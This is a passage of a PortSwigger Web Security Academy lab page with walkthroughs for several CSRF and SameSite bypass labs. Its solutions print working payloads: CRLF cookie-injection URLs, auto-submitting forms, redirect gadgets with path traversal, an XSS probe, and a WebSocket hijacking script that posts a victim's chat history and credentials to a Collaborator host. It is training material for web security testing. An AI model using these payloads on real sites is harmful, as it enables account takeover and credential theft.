                    href="https://portswigger.net/academy/labs/launch/e32727c0220c06992583ba03b02655e4edbc8c9127fff08a29ad3c40c169495d?referrer=%2fweb-security%2fcsrf%2fbypassing-token-validation%2flab-token-tied-to-non-session-cookie"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Open Burp's browser and log in to your account. Submit the "Update email" form, and
                                    find the resulting request in your Proxy history.
                                </li>
                                <li>
                                    Send the request to Burp Repeater and observe that changing the
                                    <code>
        session
       </code>
                                    cookie logs you out, but changing the
                                    <code>
        csrfKey
       </code>
                                    cookie merely results in the CSRF token being rejected. This suggests that the
                                    <code>
        csrfKey
       </code>
                                    cookie may not be strictly tied to the session.
                                </li>
                                <li>
                                    Open a private/incognito browser window, log in to your other account, and send a
                                    fresh update email request into Burp Repeater.
                                </li>
                                <li>
                                    Observe that if you swap the
                                    <code>
        csrfKey
       </code>
                                    cookie and
                                    <code>
        csrf
       </code>
                                    parameter from the first account to the second account, the request is accepted.
                                </li>
                                <li>
                                    Close the Repeater tab and incognito browser.
                                </li>
                                <li>
                                    Back in the original browser, perform a search, send the resulting request to Burp
                                    Repeater, and observe that the search term gets reflected in the Set-Cookie header.
                                    Since the search function has no CSRF protection, you can use this to inject cookies
                                    into the victim user's browser.
                                </li>
                                <li>
                                    <p>
                                        Create a URL that uses this vulnerability to inject your
                                        <code>
         csrfKey
        </code>
                                        cookie into the victim's browser:
                                    </p>
                                    <code class="code-scrollable">
        /?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
       </code>
                                </li>
                                <li>
                                    Create and host a proof of concept exploit as described in the solution to the
                                    <a href="https://portswigger.net/web-security/csrf/lab-no-defenses">
                                        CSRF vulnerability with no defenses
                                    </a>
                                    lab, ensuring that you include your CSRF token. The exploit should be created from
                                    the email change request.
                                </li>
                                <li>
                                    <p>
                                        Remove the auto-submit
                                        <code>
         &lt;script&gt;
        </code>
                                        block, and instead add the following code to inject the cookie:
                                    </p>
                                    <code class="code-scrollable">
        &lt;img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()"&gt;
       </code>
                                </li>
                                <li>
                                    Change the email address in your exploit so that it doesn't match your own.
                                </li>
                                <li>
                                    Store the exploit, then click "Deliver to victim" to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: CSRF where token is duplicated in cookie
                (csrf)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double
                submit" CSRF prevention technique.
            </p>
            <p>
                To solve the lab, use your exploit server to host an HTML page that uses a
                <a href="https://portswigger.net/web-security/csrf">
                    CSRF attack
                </a>
                to change the viewer's email address.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You cannot register an email address that is already taken by another user. If you
                                change your own email address while testing your exploit, make sure you use a different
                                email address for the final exploit you deliver to the victim.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/681e7cf13b94031af2af240c4c07e7885859b8205e31bd6b511abb2077bc0227?referrer=%2fweb-security%2fcsrf%2fbypassing-token-validation%2flab-token-duplicated-in-cookie"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Open Burp's browser and log in to your account. Submit the "Update email" form, and
                                    find the resulting request in your Proxy history.
                                </li>
                                <li>
                                    Send the request to Burp Repeater and observe that the value of the
                                    <code>
        csrf
       </code>
                                    body parameter is simply being validated by comparing it with the
                                    <code>
        csrf
       </code>
                                    cookie.
                                </li>
                                <li>
                                    Perform a search, send the resulting request to Burp Repeater, and observe that the
                                    search term gets reflected in the Set-Cookie header. Since the search function has
                                    no CSRF protection, you can use this to inject cookies into the victim user's
                                    browser.
                                </li>
                                <li>
                                    <p>
                                        Create a URL that uses this vulnerability to inject a fake
                                        <code>
         csrf
        </code>
                                        cookie into the victim's browser:
                                    </p>
                                    <code class="code-scrollable">
        /?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
       </code>
                                </li>
                                <li>
                                    Create and host a proof of concept exploit as described in the solution to the
                                    <a href="https://portswigger.net/web-security/csrf/lab-no-defenses">
                                        CSRF vulnerability with no defenses
                                    </a>
                                    lab, ensuring that your CSRF token is set to "fake". The exploit should be created
                                    from the email change request.
                                </li>
                                <li>
                                    <p>
                                        Remove the auto-submit
                                        <code>
         &lt;script&gt;
        </code>
                                        block and instead add the following code to inject the cookie and submit the
                                        form:
                                    </p>
                                    <code class="code-scrollable">
        &lt;img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/&gt;
       </code>
                                </li>
                                <li>
                                    Change the email address in your exploit so that it doesn't match your own.
                                </li>
                                <li>
                                    Store the exploit, then click "Deliver to victim" to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: SameSite Lax bypass via method override
                (csrf)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab's change email function is vulnerable to CSRF. To solve the lab, perform a
                <a href="https://portswigger.net/web-security/csrf">
                    CSRF attack
                </a>
                that changes the victim's email address. You should use the provided exploit server to host your attack.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    The default
                    <a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions">
                        SameSite
                    </a>
                    restrictions differ between browsers. As the victim uses Chrome, we recommend also using Chrome (or
                    Burp's built-in Chromium browser) to test your exploit.
                </p>
            </div>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You cannot register an email address that is already taken by another user. If you
                                change your own email address while testing your exploit, make sure you use a different
                                email address for the final exploit you deliver to the victim.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/ddae9bffdcb03f70c0ece2fac25e236d84670c553a409d983f4d364a96ed45a3?referrer=%2fweb-security%2fcsrf%2fbypassing-samesite-restrictions%2flab-samesite-lax-bypass-via-method-override"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <h5>
                                Study the change email function
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        In Burp's browser, log in to your own account and change your email address.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp, go to the
                                        <strong>
                                            Proxy &gt; HTTP history
                                        </strong>
                                        tab.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Study the
                                        <code>
         POST /my-account/change-email
        </code>
                                        request and notice that this doesn't contain any unpredictable tokens, so may be
                                        vulnerable to CSRF if you can bypass the SameSite cookie restrictions.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Look at the response to your
                                        <code>
         POST /login
        </code>
                                        request. Notice that the website doesn't explicitly specify any SameSite
                                        restrictions when setting session cookies. As a result, the browser will use the
                                        default
                                        <code>
         Lax
        </code>
                                        restriction level.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Recognize that this means the session cookie will be sent in cross-site
                                        <code>
         GET
        </code>
                                        requests, as long as they involve a top-level navigation.
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Bypass the SameSite restrictions
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        Send the
                                        <code>
         POST /my-account/change-email
        </code>
                                        request to Burp Repeater.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp Repeater, right-click on the request and select
                                        <strong>
                                            Change request method
                                        </strong>
                                        . Burp automatically generates an equivalent
                                        <code>
         GET
        </code>
                                        request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the request. Observe that the endpoint only allows
                                        <code>
         POST
        </code>
                                        requests.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Try overriding the method by adding the
                                        <code>
         _method
        </code>
                                        parameter to the query string:
                                    </p>
                                    <code class="code-scrollable">
        GET /my-account/change-email?email=foo%40web-security-academy.net&amp;_method=POST HTTP/1.1
       </code>
                                </li>
                                <li>
                                    <p>
                                        Send the request. Observe that this seems to have been accepted by the server.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the browser, go to your account page and confirm that your email address has
                                        changed.
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Craft an exploit
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        In the browser, go to the exploit server.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the
                                        <strong>
                                            Body
                                        </strong>
                                        section, create an HTML/JavaScript payload that induces the viewer's browser to
                                        issue the malicious
                                        <code>
         GET
        </code>
                                        request. Remember that this must cause a top-level navigation in order for the
                                        session cookie to be included. The following is one possible approach:
                                    </p>
                                    <code class="code-scrollable">
        &lt;script&gt;
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&amp;_method=POST";
&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    <p>
                                        Store and view the exploit yourself. Confirm that this has successfully changed
                                        your email address on the target site.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Change the email address in your exploit so that it doesn't match your own.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Deliver the exploit to the victim to solve the lab.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: SameSite Strict bypass via client-side redirect
                (csrf)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab's change email function is vulnerable to CSRF. To solve the lab, perform a
                <a href="https://portswigger.net/web-security/csrf">
                    CSRF attack
                </a>
                that changes the victim's email address. You should use the provided exploit server to host your attack.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You cannot register an email address that is already taken by another user. If you
                                change your own email address while testing your exploit, make sure you use a different
                                email address for the final exploit you deliver to the victim.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/0706592c0e05520a0d622e33957f791edd8348e91ea46cc2899bab8fd501e37b?referrer=%2fweb-security%2fcsrf%2fbypassing-samesite-restrictions%2flab-samesite-strict-bypass-via-client-side-redirect"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <h5>
                                Study the change email function
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        In Burp's browser, log in to your own account and change your email address.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp, go to the
                                        <strong>
                                            Proxy &gt; HTTP history
                                        </strong>
                                        tab.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Study the
                                        <code>
         POST /my-account/change-email
        </code>
                                        request and notice that this doesn't contain any unpredictable tokens, so may be
                                        vulnerable to CSRF if you can bypass any
                                        <a
                                            href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions">
                                            SameSite
                                        </a>
                                        cookie restrictions.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Look at the response to your
                                        <code>
         POST /login
        </code>
                                        request. Notice that the website explicitly specifies
                                        <code>
         SameSite=Strict
        </code>
                                        when setting session cookies. This prevents the browser from including these
                                        cookies in cross-site requests.
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Identify a suitable gadget
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        In the browser, go to one of the blog posts and post an arbitrary comment.
                                        Observe that you're initially sent to a confirmation page at
                                        <code>
         /post/comment/confirmation?postId=x
        </code>
                                        but, after a few seconds, you're taken back to the blog post.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp, go to the proxy history and notice that this redirect is handled
                                        client-side using the imported JavaScript file
                                        <code>
         /resources/js/commentConfirmationRedirect.js
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Study the JavaScript and notice that this uses the
                                        <code>
         postId
        </code>
                                        query parameter to dynamically construct the path for the client-side redirect.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the proxy history, right-click on the
                                        <code>
         GET /post/comment/confirmation?postId=x
        </code>
                                        request and select
                                        <strong>
                                            Copy URL
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the browser, visit this URL, but change the
                                        <code>
         postId
        </code>
                                        parameter to an arbitrary string.
                                    </p>
                                    <code class="code-scrollable">
        /post/comment/confirmation?postId=foo
       </code>
                                </li>
                                <li>
                                    <p>
                                        Observe that you initially see the post confirmation page before the client-side
                                        JavaScript attempts to redirect you to a path containing your injected string,
                                        for example,
                                        <code>
         /post/foo
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Try injecting a
                                        <a href="https://portswigger.net/web-security/file-path-traversal">
                                            path traversal
                                        </a>
                                        sequence so that the dynamically constructed redirect URL will point to your
                                        account page:
                                    </p>
                                    <code class="code-scrollable">
        /post/comment/confirmation?postId=1/../../my-account
       </code>
                                </li>
                                <li>
                                    <p>
                                        Observe that the browser normalizes this URL and successfully takes you to your
                                        account page. This confirms that you can use the
                                        <code>
         postId
        </code>
                                        parameter to elicit a
                                        <code>
         GET
        </code>
                                        request for an arbitrary endpoint on the target site.
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Bypass the SameSite restrictions
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        In the browser, go to the exploit server and create a script that induces the
                                        viewer's browser to send the
                                        <code>
         GET
        </code>
                                        request you just tested. The following is one possible approach:
                                    </p>
                                    <code class="code-scrollable">
        &lt;script&gt;
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account";
&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    <p>
                                        Store and view the exploit yourself.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that when the client-side redirect takes place, you still end up on your
                                        logged-in account page. This confirms that the browser included your
                                        authenticated session cookie in the second request, even though the initial
                                        comment-submission request was initiated from an arbitrary external site.
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Craft an exploit
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        Send the
                                        <code>
         POST /my-account/change-email
        </code>
                                        request to Burp Repeater.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp Repeater, right-click on the request and select
                                        <strong>
                                            Change request method
                                        </strong>
                                        . Burp automatically generates an equivalent
                                        <code>
         GET
        </code>
                                        request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the request. Observe that the endpoint allows you to change your email
                                        address using a
                                        <code>
         GET
        </code>
                                        request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go back to the exploit server and change the
                                        <code>
         postId
        </code>
                                        parameter in your exploit so that the redirect causes the browser to send the
                                        equivalent
                                        <code>
         GET
        </code>
                                        request for changing your email address:
                                    </p>
                                    <code class="code-scrollable">
        &lt;script&gt;
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
&lt;/script&gt;
       </code>
                                    <p>
                                        Note that you need to include the
                                        <code>
         submit
        </code>
                                        parameter and URL encode the ampersand delimiter to avoid breaking out of the
                                        <code>
         postId
        </code>
                                        parameter in the initial setup request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Test the exploit on yourself and confirm that you have successfully changed your
                                        email address.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Change the email address in your exploit so that it doesn't match your own.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Deliver the exploit to the victim. After a few seconds, the lab is solved.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: SameSite Strict bypass via sibling domain
                (csrf)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab's live chat feature is vulnerable to
                <a href="https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking">
                    cross-site WebSocket hijacking
                </a>
                (
                <a href="https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking">
                    CSWSH
                </a>
                ). To solve the lab, log in to the victim's account.
            </p>
            <p>
                To do this, use the provided exploit server to perform a CSWSH attack that exfiltrates the victim's chat
                history to the default Burp Collaborator server. The chat history contains the login credentials in
                plain text.
            </p>
            <p>
                If you haven't done so already, we recommend completing our topic on
                <a href="https://portswigger.net/web-security/websockets">
                    WebSocket vulnerabilities
                </a>
                before attempting this lab.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                Make sure you fully audit all of the available attack surface. Keep an eye out for
                                additional vulnerabilities that may help you to deliver your attack, and bear in mind
                                that two domains can be located within the same site.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/44cca99334d60d91033bf4bd0908a142896514af0a3c0c343f8017fe71781ae9?referrer=%2fweb-security%2fcsrf%2fbypassing-samesite-restrictions%2flab-samesite-strict-bypass-via-sibling-domain"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <h5>
                                Study the live chat feature
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        In Burp's browser, go to the live chat feature and send a few messages.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp, go to the
                                        <strong>
                                            Proxy &gt; HTTP history
                                        </strong>
                                        tab and find the WebSocket handshake request. This should be the most recent
                                        <code>
         GET /chat
        </code>
                                        request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Notice that this doesn't contain any unpredictable tokens, so may be vulnerable
                                        to CSWSH if you can bypass any
                                        <a
                                            href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions">
                                            SameSite
                                        </a>
                                        cookie restrictions.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the browser, refresh the live chat page.
                                    </p>
                                </li>
                                <li>
                                    <p no-keyword-injection="">
                                        In Burp, go to the
                                        <strong>
                                            Proxy &gt; WebSockets history
                                        </strong>
                                        tab. Notice that when you refresh the page, the browser sends a
                                        <code>
         READY
        </code>
                                        message to the server. This causes the server to respond with the entire chat
                                        history.
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Confirm the CSWSH vulnerability
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        In Burp, go to the
                                        <strong>
                                            Collaborator
                                        </strong>
                                        tab and click
                                        <strong>
                                            Copy to clipboard
                                        </strong>
                                        . A new Collaborator payload is saved to your clipboard.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the browser, go to the exploit server and use the following template to
                                        create a script for a CSWSH proof of concept:
                                    </p>
                                    <code class="code-scrollable">
        &lt;script&gt;
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    <p>
                                        Store and view the exploit yourself
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp, go back to the
                                        <strong>
                                            Collaborator
                                        </strong>
                                        tab and click
                                        <strong>
                                            Poll now
                                        </strong>
                                        . Observe that you have received an HTTP interaction, which indicates that
                                        you've opened a new live chat connection with the target site.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Notice that although you've confirmed the CSWSH vulnerability, you've only
                                        exfiltrated the chat history for a brand new session, which isn't particularly
                                        useful.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go to the
                                        <strong>
                                            Proxy &gt; HTTP history
                                        </strong>
                                        tab and find the WebSocket handshake request that was triggered by your script.
                                        This should be the most recent
                                        <code>
         GET /chat
        </code>
                                        request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Notice that your session cookie was not sent with the request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the response, notice that the website explicitly specifies
                                        <code>
         SameSite=Strict
        </code>
                                        when setting session cookies. This prevents the browser from including these
                                        cookies in cross-site requests.
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Identify an additional vulnerability in the same "site"
                            </h5>
                            <ol>
                                <li>
                                    <p no-keyword-injection="">
                                        In Burp, study the proxy history and notice that responses to requests for
                                        resources like script and image files contain an
                                        <code>
         Access-Control-Allow-Origin
        </code>
                                        header, which reveals a sibling domain at
                                        <code>
         cms-YOUR-LAB-ID.web-security-academy.net
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the browser, visit this new URL to discover an additional login form.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Submit some arbitrary login credentials and observe that the username is
                                        reflected in the response in the
                                        <code>
         Invalid username
        </code>
                                        message.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Try injecting an XSS payload via the
                                        <code>
         username
        </code>
                                        parameter, for example:
                                    </p>
                                    <code>
        &lt;script&gt;alert(1)&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    <p>
                                        Observe that the
                                        <code>
         alert(1)
        </code>
                                        is called, confirming that this is a viable
                                        <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">
                                            reflected XSS
                                        </a>
                                        vector.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the
                                        <code>
         POST /login
        </code>
                                        request containing the XSS payload to Burp Repeater.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp Repeater, right-click on the request and select
                                        <strong>
                                            Change request method
                                        </strong>
                                        to convert the method to
                                        <code>
         GET
        </code>
                                        . Confirm that it still receives the same response.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Right-click on the request again and select
                                        <strong>
                                            Copy URL
                                        </strong>
                                        . Visit this URL in the browser and confirm that you can still trigger the XSS.
                                        As this sibling domain is part of the same site, you can use this XSS to launch
                                        the CSWSH attack without it being mitigated by SameSite restrictions.
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Bypass the SameSite restrictions
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        Recreate the CSWSH script that you tested on the exploit server earlier.
                                    </p>
                                    <code class="code-scrollable">
        &lt;script&gt;
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    <p>
                                        URL encode the entire script.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go back to the exploit server and create a script that induces the viewer's
                                        browser to send the
                                        <code>
         GET
        </code>
                                        request you just tested, but use the URL-encoded CSWSH payload as the
                                        <code>
         username
        </code>
                                        parameter. The following is one possible approach:
                                    </p>
                                    <code class="code-scrollable">
        &lt;script&gt;
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&amp;password=anything";
&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    <p>
                                        Store and view the exploit yourself.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp, go back to the
                                        <strong>
                                            Collaborator
                                        </strong>
                                        tab and click
                                        <strong>
                                            Poll now
                                        </strong>
                                        . Observe that you've received a number of new interactions, which contain your
                                        entire chat history.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go to the
                                        <strong>
                                            Proxy &gt; HTTP history
                                        </strong>
                                        tab and find the WebSocket handshake request that was triggered by your script.
                                        This should be the most recent
                                        <code>
         GET /chat
        </code>
                                        request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Confirm that this request does contain your session cookie. As it was initiated
                                        from the vulnerable sibling domain, the browser considers this a same-site
                                        request.
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Deliver the exploit chain
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        Go back to the exploit server and deliver the exploit to the victim.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp, go back to the
                                        <strong>
                                            Collaborator
                                        </strong>
                                        tab and click
                                        <strong>
                                            Poll now
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that you've received a number of new interactions.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Study the HTTP interactions and notice that these contain the victim's chat
                                        history.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Find a message containing the victim's username and password.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Use the newly obtained credentials to log in to the victim's account and the lab
                                        is solved.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: SameSite Lax bypass via cookie refresh
                (csrf)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab's change email function is vulnerable to CSRF. To solve the lab, perform a
                <a href="https://portswigger.net/web-security/csrf">
                    CSRF attack
                </a>
                that changes the victim's email address. You should use the provided exploit server to host your attack.
            </p>
            <p>
                The lab supports OAuth-based login. You can log in via your social media account with the following
                credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    The default
                    <a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions">
                        SameSite
                    </a>
                    restrictions differ between browsers. As the victim uses Chrome, we recommend also using Chrome (or
                    Burp's built-in Chromium browser) to test your exploit.
                </p>
            </div>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ul>
                                <li>
                                    <p>
                                        You cannot register an email address that is already taken by another user. If
                                        you change your own email address while testing your exploit, make sure you use
                                        a different email address for the final exploit you deliver to the victim.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Browsers block popups from being opened unless they are triggered by a manual
                                        user interaction, such as a click. The victim user will click on any page you
                                        send them to, so you can create popups using a global event handler as follows:
                                    </p>
                                    <code class="code-scrollable">
        &lt;script&gt;
    window.onclick = () =&gt; {
        window.open('about:blank')
    }
&lt;/script&gt;
       </code>
                                </li>
                            </ul>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
